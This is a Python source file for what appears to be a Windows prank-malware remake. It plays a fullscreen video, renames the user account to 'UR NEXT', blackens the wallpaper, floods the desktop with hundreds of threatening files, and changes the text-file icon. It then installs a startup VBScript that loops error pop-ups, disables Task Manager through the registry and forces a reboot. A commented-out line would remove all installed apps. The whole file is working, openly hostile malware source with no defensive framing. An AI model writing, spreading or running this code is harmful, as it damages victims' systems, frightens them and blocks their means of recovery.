import pygame
import time
import os
import getpass
import ctypes
from PIL import Image
import cv2
import sys
from PIL import Image, ImageDraw, ImageFont

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)

def video():
    pygame.init()

    info = pygame.display.Info()
    screen_w, screen_h = info.current_w, info.current_h
    window = pygame.display.set_mode((screen_w, screen_h), pygame.FULLSCREEN)

    video_path = resource_path("video.mp4")
    cap = cv2.VideoCapture(video_path)

    clock = pygame.time.Clock()
    start_time = time.time()

    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break

        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        frame_surface = pygame.surfarray.make_surface(frame.swapaxes(0, 1))
        frame_surface = pygame.transform.scale(frame_surface, (screen_w, screen_h))
        window.blit(frame_surface, (0, 0))
        pygame.display.flip()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                cap.release()
                pygame.quit()
                return
            elif event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
                cap.release()
                pygame.quit()
                return

        if time.time() - start_time >= 15:
            break

        clock.tick(30)

    cap.release()
    pygame.quit()

def changethings():
    current_username = getpass.getuser() #find current username
    print(current_username)
    os.system(f'wmic useraccount where name="{current_username}" rename "UR NEXT"') #change username
    print("change username, 1")

    img = Image.new('RGB', (500, 500), color=0) #save black image
    img.save('C:\\black.png')
    ctypes.windll.user32.SystemParametersInfoW(20, 0 , "C:\\black.png" ,3) #change background black
    print("change background, 2")

    # os.system("powershell Get-AppxPackage -AllUsers | Remove-AppxPackage")
    # print("remove UWP Apps, 3") #보류 tlqkf

    openme = "OPENME" * 20
    openmepath = f"C:\\Users\\{current_username}\\Desktop\\{openme}.rtf"
    openmecontents = '''{\\rtf1\\ansi\\deff3\\adeflang1025
{\\fonttbl{\\f0\\froman\\fprq2\\fcharset0 Times New Roman;}{\\f1\\froman\\fprq2\\fcharset2 Symbol;}{\\f2\\fswiss\\fprq2\\fcharset0 Arial;}{\\f3\\froman\\fprq2\\fcharset129 Liberation Serif{\\*\\falt Times New Roman};}{\\f4\\froman\\fprq2\\fcharset129 Liberation Sans{\\*\\falt Arial};}{\\f5\\froman\\fprq2\\fcharset129 \\'b8\\'bc\\'c0\\'ba \\'b0\\'ed\\'b5\\'f1;}{\\f6\\fnil\\fprq2\\fcharset129 \\'b8\\'bc\\'c0\\'ba \\'b0\\'ed\\'b5\\'f1;}{\\f7\\fnil\\fprq2\\fcharset129 Arial;}}
{\\colortbl;\\red0\\green0\\blue0;\\red0\\green0\\blue255;\\red0\\green255\\blue255;\\red0\\green255\\blue0;\\red255\\green0\\blue255;\\red255\\green0\\blue0;\\red255\\green255\\blue0;\\red255\\green255\\blue255;\\red0\\green0\\blue128;\\red0\\green128\\blue128;\\red0\\green128\\blue0;\\red128\\green0\\blue128;\\red128\\green0\\blue0;\\red128\\green128\\blue0;\\red128\\green128\\blue128;\\red192\\green192\\blue192;}
{\\stylesheet{\\s0\\snext0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033 Normal;}
{\\*\\cs15\\snext15\\rtlch\\ab\\ltrch\\b Strong;}
{\\*\\cs16\\snext16 ListLabel 1;}
{\\*\\cs17\\snext17 ListLabel 2;}
{\\*\\cs18\\snext18 ListLabel 3;}
{\\*\\cs19\\snext19 ListLabel 4;}
{\\*\\cs20\\snext20 ListLabel 5;}
{\\*\\cs21\\snext21 ListLabel 6;}
{\\*\\cs22\\snext22 ListLabel 7;}
{\\*\\cs23\\snext23 ListLabel 8;}
{\\*\\cs24\\snext24 ListLabel 9;}
{\\*\\cs25\\snext25 ListLabel 10;}
{\\*\\cs26\\snext26 ListLabel 11;}
{\\*\\cs27\\snext27 ListLabel 12;}
{\\*\\cs28\\snext28 ListLabel 13;}
{\\*\\cs29\\snext29 ListLabel 14;}
{\\*\\cs30\\snext30 ListLabel 15;}
{\\*\\cs31\\snext31 ListLabel 16;}
{\\*\\cs32\\snext32 ListLabel 17;}
{\\*\\cs33\\snext33 ListLabel 18;}
{\\s34\\sbasedon0\\snext35\\sb240\\sa120\\keepn\\rtlch\\af7\\afs28\\ltrch\\hich\\af4\\afs28\\dbch\\af6\\loch\\f4\\fs28 Heading;}
{\\s35\\sbasedon0\\snext35\\sl276\\slmult1\\sb0\\sa140 Body Text;}
{\\s36\\sbasedon35\\snext36\\sl240\\slmult1\\sb0\\sa0\\rtlch\\af7\\ltrch List;}
{\\s37\\sbasedon0\\snext37\\sb120\\sa120\\rtlch\\af7\\afs24\\ai\\ltrch\\fs24\\i caption;}
{\\s38\\sbasedon0\\snext38\\rtlch\\af7\\ltrch Index;}
}{\\*\\listtable{\\list\\listtemplateid1
{\\listlevel\\levelnfc255\\leveljc0\\levelstartat1\\levelfollow2{\\leveltext \\'00;}{\\levelnumbers;}\\fi0\\li0}
{\\listlevel\\levelnfc255\\leveljc0\\levelstartat1\\levelfollow2{\\leveltext \\'00;}{\\levelnumbers;}\\fi0\\li0}
{\\listlevel\\levelnfc255\\leveljc0\\levelstartat1\\levelfollow2{\\leveltext \\'00;}{\\levelnumbers;}\\fi0\\li0}
{\\listlevel\\levelnfc255\\leveljc0\\levelstartat1\\levelfollow2{\\leveltext \\'00;}{\\levelnumbers;}\\fi0\\li0}
{\\listlevel\\levelnfc255\\leveljc0\\levelstartat1\\levelfollow2{\\leveltext \\'00;}{\\levelnumbers;}\\fi0\\li0}
{\\listlevel\\levelnfc255\\leveljc0\\levelstartat1\\levelfollow2{\\leveltext \\'00;}{\\levelnumbers;}\\fi0\\li0}
{\\listlevel\\levelnfc255\\leveljc0\\levelstartat1\\levelfollow2{\\leveltext \\'00;}{\\levelnumbers;}\\fi0\\li0}
{\\listlevel\\levelnfc255\\leveljc0\\levelstartat1\\levelfollow2{\\leveltext \\'00;}{\\levelnumbers;}\\fi0\\li0}
{\\listlevel\\levelnfc255\\leveljc0\\levelstartat1\\levelfollow2{\\leveltext \\'00;}{\\levelnumbers;}\\fi0\\li0}\\listid1}
}{\\listoverridetable{\\listoverride\\listid1\\listoverridecount0\\ls1}}{\\*\\generator LibreOffice/26.2.0.3$Windows_X86_64 LibreOffice_project/620$Build-3}{\\info{\\creatim\\yr2026\\mo2\\dy8\\hr12\\min37}{\\revtim\\yr2026\\mo2\\dy8\\hr12\\min41}{\\printim\\yr0\\mo0\\dy0\\hr0\\min0}}{\\*\\userprops}\\deftab709
\\hyphauto1\\viewscale100\\formshade\\nobrkwrptbl\\paperh16838\\paperw11906\\margl1134\\margr1134\\margt1134\\margb1134\\sectd\\sbknone\\sftnnar\\saftnnrlc\\sectunlocked1\\pgwsxn11906\\pghsxn16838\\marglsxn1134\\margrsxn1134\\margtsxn1134\\margbsxn1134\\ftnbj\\ftnstart1\\ftnrstcont\\ftnnar\\fet\\aftnrstcont\\aftnstart1\\aftnnrlc
{\\*\\ftnsep\\chftnsep}\\pgndec\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql{\\cs15\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\ab\\loch\\f5\\fs40\\i0\\b
YOU ARE THE NEXT}
{\\rtlch\\afs40\\ltrch\\hich\\afs40\\dbch\\afs40\\loch\\fs40\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql{\\cs15\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\ab\\loch\\f5\\fs40\\i0\\b
I CAN SEE YOU}
{\\rtlch\\afs40\\ltrch\\hich\\afs40\\dbch\\afs40\\loch\\fs40\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\f5\\fs40\\i0\\b

{\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\afs40\\ai0\\ab\\loch\\f5\\fs40\\i0\\b\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql{\\cs15\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\ab\\loch\\f5\\fs40\\i0\\b
NOW IT\\uc2 \\u8217\\'a1\\'afS TOO LATE\\uc1 }
{\\rtlch\\afs40\\ltrch\\hich\\afs40\\dbch\\afs40\\loch\\fs40\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql{\\cs15\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\ab\\loch\\f5\\fs40\\i0\\b
I GOT YOU\\uc2 \\u8230\\'a1\\'a6\\u8230\\'a1\\'a6.\\uc1 }
{\\rtlch\\afs40\\ltrch\\hich\\afs40\\dbch\\afs40\\loch\\fs40\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\f5\\fs40\\i0\\b

{\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\afs40\\ai0\\ab\\loch\\f5\\fs40\\i0\\b\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql{\\cs15\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\ab\\loch\\f5\\fs40\\i0\\b
YOU HAVE BEEN WARNED}
{\\rtlch\\afs40\\ltrch\\hich\\afs40\\dbch\\afs40\\loch\\fs40\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\f5\\fs40\\i0\\b

{\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\afs40\\ai0\\ab\\loch\\f5\\fs40\\i0\\b\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\f5\\fs40\\i0\\b

{\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\afs40\\ai0\\ab\\loch\\f5\\fs40\\i0\\b\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\f5\\fs40\\i0\\b

{\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\afs40\\ai0\\ab\\loch\\f5\\fs40\\i0\\b\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\f5\\fs40\\i0\\b

{\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\afs40\\ai0\\ab\\loch\\f5\\fs40\\i0\\b\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\f5\\fs40\\i0\\b

{\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\afs40\\ai0\\ab\\loch\\f5\\fs40\\i0\\b\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\f5\\fs40\\i0\\b

{\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\afs40\\ai0\\ab\\loch\\f5\\fs40\\i0\\b\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\f5\\fs40\\i0\\b

{\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\afs40\\ai0\\ab\\loch\\f5\\fs40\\i0\\b\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\f5\\fs40\\i0\\b

{\\scaps0\\caps0\\cf1\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\afs40\\ai0\\ab\\loch\\f5\\fs40\\i0\\b\\par}\\pard\\plain \\s0\\widctlpar\\hyphpar0\\ltrpar\\cf0\\kerning1\\rtlch\\af7\\afs24\\alang1033\\ltrch\\hich\\af3\\afs24\\alang1033\\dbch\\af6\\langfe1042\\loch\\f3\\fs24\\lang1033\\ql{\\cs15\\scaps0\\caps0\\cf6\\expnd0\\expndtw0\\rtlch\\afs40\\ai0\\ab\\ltrch\\hich\\af5\\afs40\\ai0\\ab\\dbch\\ab\\loch\\f5\\fs40\\i0\\b
DON\\uc2 \\u8217\\'a1\\'afT LOOK BEHIND YOU\\uc1 }
{\\rtlch\\afs40\\ltrch\\hich\\afs40\\dbch\\afs40\\loch\\fs40\\par}}
'''
    with open(openmepath, 'w', encoding='utf-8') as f:
        f.write(openmecontents)
    print("wrote OPENME file, 5")

    for i in range(400): #write URNEXTURNEXT... txt file 
        urnext = "UR NEXT" * 10
        file_name = f"{urnext}{i}.txt"
        urnextpath = f"C:\\Users\\{current_username}\\Desktop\\{file_name}"

        with open(urnextpath, 'w', encoding='utf-8') as f:
            urnext = "UR NEXT\n" * 30
            f.write(f'{urnext}')
            print("wrote URNEXT files, 6")

    #making URNEXT ico
    width, height = 64, 64
    bg_color = (255, 0, 0)
    text_color = (0, 0, 0)

    img = Image.new("RGB", (width, height), bg_color)

    draw = ImageDraw.Draw(img)
    text = ("UR\n\n\nNEXT")
    font = ImageFont.load_default()

    bbox = draw.multiline_textbbox((0, 0), text, font=font, align="center")
    text_width = bbox[2] - bbox[0]
    text_height = bbox[3] - bbox[1]
    x = (width - text_width) // 2
    y = (height - text_height) // 2
    draw.multiline_text((x, y), text, fill=text_color, font=font, align="center")

    img.save(f"C:\\Users\\{current_username}\\Documents\\ico.ico")
    print("ico.ico")
    
    #rnaway.vbs, looprnaway.vbs
    looprnaway_vbs_path = f"C:\\Users\\{current_username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\looprnaway.vbs"
    rnaway_vbs_path = f"C:\\rnaway.vbs"
    with open(rnaway_vbs_path, 'w', encoding='utf-8') as f: #rnaway.vbs
            f.write('msgbox "runaway",vbCritical,"runaway"')
            print('wrote rnaway.vbs')

    with open(looprnaway_vbs_path, 'w', encoding='utf-8') as f: #looprnaway.vbs
            f.write(f'''Set WshShell = CreateObject("WScript.Shell")

    Do
        WshShell.Run "C:\\rnaway.vbs", 1, False
        WScript.Sleep 500
    Loop
    ''')
            print('wrote looprnaway.vbs')

    os.system(f'reg add "HKEY_CLASSES_ROOT\\txtfile\\DefaultIcon" /ve /t REG_SZ /d "C:/Users/{current_username}/Documents/ico.ico" /f') #change txt icon
    print("changed txt icon")
    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f') #disabletaskmgr
    print("disable taskmgr")
    time.sleep(0.5)
    os.system('shutdown -r -f -t 0') #reboot


print("Original from FlyTech Remake by ro1004bin")
video()
changethings()